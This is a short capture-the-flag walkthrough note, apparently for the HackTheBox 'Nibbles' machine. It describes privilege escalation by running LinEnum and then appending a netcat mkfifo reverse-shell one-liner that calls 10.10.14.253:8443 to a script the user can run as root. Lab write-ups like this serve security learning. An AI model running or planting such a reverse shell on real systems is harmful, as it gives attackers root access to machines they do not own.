---
title: '4th Step - Priv Escalation '
updated: 2022-12-23T20:27:28.0000000+00:00
created: 2022-12-20T09:12:59.0000000+00:00
---

Now that we have a foothold, we want root. The mointor.sh file could be vulnerable, so we should download it and check it out.

We do this via a python http server:
![image1](../../../../../_resources/image1-85.png)

Then we run - on the remote machine:
![image2](../../../../../_resources/image2-67.png)

This should return a **200** success response:
![image3](../../../../../_resources/image3-58.png)

What this does is download a script that we can run that looks for vulnerabilities.
(The automated script is: <https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>)

This gives us the following info on any superusers:
![image4](../../../../../_resources/image4-49.png)

This tells us that the **nibbler** user can run the monitor.sh file with root, if we get another reverse shell we can become root.

We can inject a reverse shell 1-liner to the file:

**echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.10.14.253 8443 \>/tmp/f' \| tee -a monitor.sh**

Note that tee -a, appends the reverse shell to the monitor.sh file. **MAKE SURE YOU APPEND AND DON'T OVERWRITE WRITEABLE FILES.** This is so that we avoid disrupting the system.

Getting root:

Once we append the shell script to monitor.sh all we need to do is start a nc listener on our own machine and execute the script.
![image5](../../../../../_resources/image5-38.png)

![image6](../../../../../_resources/image6-28.png)

![image7](../../../../../_resources/image7-22.png)

We can then move to the root directory and pick up the flag:
![image8](../../../../../_resources/image8-20.png)

And we have pwned nibbles
